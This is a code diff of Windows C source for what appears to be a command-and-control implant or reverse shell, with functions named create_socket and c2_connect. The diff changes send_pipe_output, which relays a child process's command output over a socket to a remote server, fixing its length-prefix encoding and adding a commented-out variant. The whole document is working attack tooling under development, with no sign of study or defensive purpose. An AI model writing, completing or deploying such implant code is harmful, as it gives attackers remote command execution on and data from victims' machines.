@@ -27,7 +27,6 @@ const SOCKET create_socket()
 	// Create socket and hint structure
 	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
-	//const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (connect_socket == INVALID_SOCKET)
 		WSACleanup();
 
@@ -53,6 +52,30 @@ int c2_connect(const SOCKET connect_socket)
 	return SUCCESS;
 }
 
+/*int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET connect_socket) 
+{
+	DWORD bytes_read;
+	while (1) 
+	{
+		// Read stdout, stderr bytes from pipe.
+		ReadFile(child_stdout_read, buf+sizeof(uint32_t), BUFLEN-sizeof(uint32_t), &bytes_read, NULL);
+
+		uint32_t chunk_size_nbytes = ntohl((uint32_t)bytes_read);
+		memcpy(buf, &chunk_size_nbytes, sizeof(uint32_t));
+
+		// Send serialized chunk size int32 bytes to server.
+		if (send(connect_socket, buf, sizeof(uint32_t)+bytes_read, 0) < 1)
+			return SOCKET_ERROR;
+
+		// If we've reached the end of the child's stdout, stderr.
+		if (bytes_read == 0)
+			break;
+	}
+
+	return SUCCESS;
+}
+*/
+
 int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET connect_socket) 
 {
 	DWORD bytes_read; 
@@ -61,19 +84,18 @@ int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET con
 		// Read stdout, stderr bytes from pipe.
 		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);
 
-		uint64_t chunk_size = (uint64_t)bytes_read;
-		uint64_t chunk_size_nbytes = htonll(chunk_size); 
+		uint32_t chunk_size_nbytes = htonl((uint32_t)bytes_read); 
 
 		// Send serialized chunk size int32 bytes to server.
-		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint64_t), 0) < 1)
+		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint32_t), 0) < 1)
 			return SOCKET_ERROR;
 
 		// If we've reached the end of the child's stdout, stderr.
 		if (bytes_read == 0)
 			break;
 
-		// Send output to server..
-		if (send(connect_socket, buf, chunk_size, 0) < 1)
+		// Send output to server.
+		if (send(connect_socket, buf, bytes_read, 0) < 1)
 			return SOCKET_ERROR;
 	}
 
